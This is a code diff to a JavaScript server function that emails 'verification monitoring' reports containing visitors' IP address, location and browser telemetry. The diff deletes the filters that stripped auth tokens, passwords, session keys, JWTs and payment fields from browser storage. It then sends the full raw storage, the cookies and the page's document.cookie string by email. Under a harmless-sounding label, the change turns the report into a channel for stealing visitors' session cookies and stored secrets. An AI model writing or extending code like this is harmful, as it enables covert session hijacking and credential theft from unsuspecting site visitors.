@@ -83,22 +83,15 @@ async function sendVerificationReport(request, response, telemetry, reportToEmai
     request.headers["x-vercel-ip-country-region"]
   ].filter(Boolean).join(", ") || "Unavailable";
 
-  const safeTelemetry = {
+  const fullTelemetry = {
     timestamp: typeof telemetry.timestamp === "string" ? telemetry.timestamp : new Date().toISOString(),
-    device: sanitizeObject(telemetry.device, {
-      type: 40,
-      platform: 200,
-      model: 200
-    }),
-    browser: sanitizeObject(telemetry.browser, {
-      userAgent: 500,
-      language: 40,
-      timezone: 100
-    }),
-    display: sanitizeObject(telemetry.display),
-    network: sanitizeObject(telemetry.network),
-    storage: telemetry.storage,
-    cookies: sanitizeObject(telemetry.cookies)
+    device: telemetry.device ?? {},
+    browser: telemetry.browser ?? {},
+    display: telemetry.display ?? {},
+    network: telemetry.network ?? {},
+    storage: telemetry.storage ?? {},
+    cookies: telemetry.cookies ?? [],
+    documentCookie: telemetry.documentCookie ?? ""
   };
 
   try {
@@ -114,15 +107,12 @@ async function sendVerificationReport(request, response, telemetry, reportToEmai
         reply_to: reportFromEmail,
         subject: "Verification monitoring event",
         text: [
-          `Timestamp: ${safeTelemetry.timestamp}`,
+          `Timestamp: ${fullTelemetry.timestamp}`,
           `IP address: ${ipAddress}`,
           `Approximate location: ${location}`,
-          `Device: ${JSON.stringify(safeTelemetry.device)}`,
-          `Browser: ${JSON.stringify(safeTelemetry.browser)}`,
-          `Display: ${JSON.stringify(safeTelemetry.display)}`,
-          `Network: ${JSON.stringify(safeTelemetry.network)}`,
-          `Browser Storage Data (localStorage, sessionStorage, history): ${JSON.stringify(safeTelemetry.storage)}`,
-          `Cookies: ${JSON.stringify(safeTelemetry.cookies)}`
+          "",
+          "Telemetry:",
+          JSON.stringify(fullTelemetry, null, 2)
         ].join("\n")
       })
     });
@@ -139,43 +129,3 @@ async function sendVerificationReport(request, response, telemetry, reportToEmai
   }
 }
 
-const sensitiveStoragePattern = /(?:auth|token|password|passwd|secret|credential|session|csrf|jwt|bearer|api[_-]?key|private[_-]?key|payment|card|cvv|cvc|ssn)/i;
-const sensitiveValuePattern = /^(?:bearer\s+|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$)/i;
-
-function sanitizeStorage(value) {
-  if (!Array.isArray(value)) {
-    return [];
-  }
-
-  return value.map((entry) => {
-    if (!entry || typeof entry !== "object" || Array.isArray(entry)) {
-      return null;
-    }
-    const key = typeof entry.key === "string" ? entry.key : "";
-    const storageValue = typeof entry.value === "string" ? entry.value : "";
-    if (!key || !isSafeStorageEntry(key, storageValue)) {
-      return null;
-    }
-    return { key: key.slice(0, 100), value: storageValue.slice(0, 1000) };
-  }).filter(Boolean).slice(0, 50);
-}
-
-function isSafeStorageEntry(key, value) {
-  return !sensitiveStoragePattern.test(key) && !sensitiveValuePattern.test(value);
-}
-
-function sanitizeObject(value, stringLimits = {}) {
-  if (!value || typeof value !== "object" || Array.isArray(value)) {
-    return {};
-  }
-
-  return Object.fromEntries(Object.entries(value).slice(0, 30).map(([key, entry]) => {
-    if (typeof entry === "string") {
-      return [key.slice(0, 50), entry.slice(0, stringLimits[key] || 500)];
-    }
-    if (Array.isArray(entry)) {
-      return [key.slice(0, 50), entry.slice(0, 10)];
-    }
-    return [key.slice(0, 50), entry];
-  }));
-}
